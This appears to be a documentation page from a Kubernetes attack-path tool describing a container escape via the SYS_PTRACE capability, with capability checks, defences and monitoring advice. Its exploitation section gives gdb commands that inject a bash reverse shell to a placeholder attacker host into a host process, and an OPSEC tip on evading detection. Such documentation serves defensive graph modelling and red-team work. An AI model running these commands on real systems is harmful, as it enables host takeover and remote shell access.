# CE_SYS_PTRACE

Given the requisite capabilities, abuse the legitimate OS debugging mechanisms to escape the container via attaching to a node process.

| Source                                    | Destination                           | MITRE                            |
| ----------------------------------------- | ------------------------------------- |----------------------------------|
| [Container](../vertices/CONTAINER.md) | [Node](../vertices/NODE.md) | [Escape to Host, T1611](https://attack.mitre.org/techniques/T1611/) |

## Details

The `SYS_PTRACE` capability, which allows the use of `ptrace()`. This system call allows a process to monitor and control the execution of another process. 

## Prerequisites

To perform this attack, the container must be started with the option `--pid=host`, which enables the sharing of the PID address space between the container and the host operating system, allowing the container process to see every other process running on the host. And the container needs to be granted `SYS_PTRACE` and `SYS_ADMIN` capabilities. 

See the [example pod spec](../../test/setup/test-cluster/attacks/CE_SYS_PTRACE.yaml).

## Checks

From within a running container, determine whether it is running with the required capabilities:

```bash
# Check the current process' capabilities
cat /proc/self/status | grep CapEff
# CapEff:	00000000a80425fb

# Decode the capabilities (on current box or offline) and check for CAP_SYS_PTRACE and CAP_SYS_ADMIN
# NOTE: can install capsh via apt-get update && apt-get install libcap2-bin
capsh --decode=00000000a80425fb | grep cap_sys_admin
capsh --decode=00000000a80425fb | grep cap_sys_ptrace
```

## Exploitation

Install a debugger into the container:

```bash
apt update && apt install gdb
```
Find a host process to target:

```bash
ps -ef # select a PID
```

Attach to the process and inject a shell command:

```bash
gdb -p <PID>
call (void)system("bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1'")
```

## OPSEC Considerations

Directly installing debugging tools makes the attack easy, but provides easy detections for defenders. Use a custom script to inject into the target process to raise the bar for detection.

## Defences

+ Implement least privilege
+ Avoid running privileged pods.

## Monitoring

+ Monitor for GDB (or other debugging tools) installation. 
+ Detect invocation of ptrace() from within a container.

## Calculation

[EscapeSysPtrace](../../pkg/kubehound/graph/edge/escape_sys_ptrace.go)

## References:

+ [Container Escape: All You Need is Cap (Capabilities)](https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities?hs_amp=true)

